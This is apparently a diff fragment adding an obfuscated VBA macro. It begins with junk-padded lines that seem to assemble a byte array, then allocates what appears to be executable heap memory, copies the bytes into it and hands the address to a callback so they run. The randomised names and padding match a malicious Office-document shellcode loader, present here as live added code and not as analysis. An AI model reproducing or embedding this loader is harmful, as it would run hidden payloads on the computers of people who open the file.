+Gcz76sJjyoLja 92, 237, 615, wEfpk2n, 89, Now
+OvT8mfhSah "thKax", 661, wEfpk2n, 227, Nothing, 74, True
+DyOJzOg174k 707, 183, wEfpk2n
+icPdqeTvwO 125, Nothing, 774, wEfpk2n, False, Now
+iTLC 868, wEfpk2n, 55
+RpYsNTkeptm wEfpk2n, 906, 86, Now, 188
+QgDhuu wEfpk2n, 943, 46, "TsKr3iO"
+kYhzCKPhaOnbkYH 31, "Neet", 240, wEfpk2n, 983, 61, 0
+bpyiN 1083, 238, True, wEfpk2n, 232, "tsOlP"
+mp1eu 89, wEfpk2n, 1118
+hsOb3ACbTQs5n Nothing, 1160, 224, 242, Nothing, wEfpk2n
+LzmI3HKkTjceNn 50, 199, 1181, 249, wEfpk2n
+j5ig918OhjiE1VG 186, 1236, 229, 202, 213, wEfpk2n, 180
+DxUMBzGEzN4Od Nothing, wEfpk2n, Now, 1279, 137
+TtW8D 98, 196, 1, 145, "vsU9rggVXQGXZ", 1322, wEfpk2n
+jk0LbuGhRU 1365, wEfpk2n, 192, 130, 129
+vm4RjiK wEfpk2n, 1388, 39, 253
+WozRM2JPuY5XI 21, 1435, 49, 40, wEfpk2n
+un7AeJrUgLZ4slD 12, 1489, wEfpk2n
+En78 True, 1575, "gW3ZOylPMSfPo4", 243, 182, 112, wEfpk2n
+MkX 236, wEfpk2n, Nothing, 109, 1667
+wH1sop 1759, wEfpk2n, 58, 87
+zAqd5wc wEfpk2n, 1847, 34, 71
+kYxT8CJ 1930, 118, wEfpk2n, True, False, Now
+QETj2GrBec 123, 102, 167, 17, 2034, 192, wEfpk2n
+AK3B28PT2i9 2074, 156, Nothing, "F74iz5gm", 50, 40, wEfpk2n
+pNe Nothing, 2090, 150, wEfpk2n, Now, 8
+tOe592aLZ4u wEfpk2n, 2115, 113, 46
+E3XeWf9wEF True, 123, 185, Now, 2196, 121, wEfpk2n
+#If VBA7 Then
+Dim qWf1q2DhSSn As LongPtr
+#Else
+Dim qWf1q2DhSSn As Long
+#End If
+qWf1q2DhSSn = pKQxbmeJPKkVtwA7nCqlV(&H40001, 0, 0)
+my5 = S1LAUnx6i5LyAHjIgPJ2(qWf1q2DhSSn, 9, &H10000)
+For s2XBsWhhW = LBound(wEfpk2n) To UBound(wEfpk2n)
+hZso3b = wEfpk2n(s2XBsWhhW)
+p5cgBtUU5j -1, ByVal my5 + s2XBsWhhW, hZso3b, 1, 0
+Next
+#If VBA7 Then
+Dim TEqRFemlLSaz As LongPtr
+#Else
+Dim TEqRFemlLSaz As Long
+#End If
+TEqRFemlLSaz = hXAIPdcmNrCQ
+pyoVTOkBjgOdXawJJEQ TEqRFemlLSaz, StrPtr("RKyNNca1TQM1p"), Rnd()
+gf9UyNJcM7p2MTnu TEqRFemlLSaz, my5
+End Sub
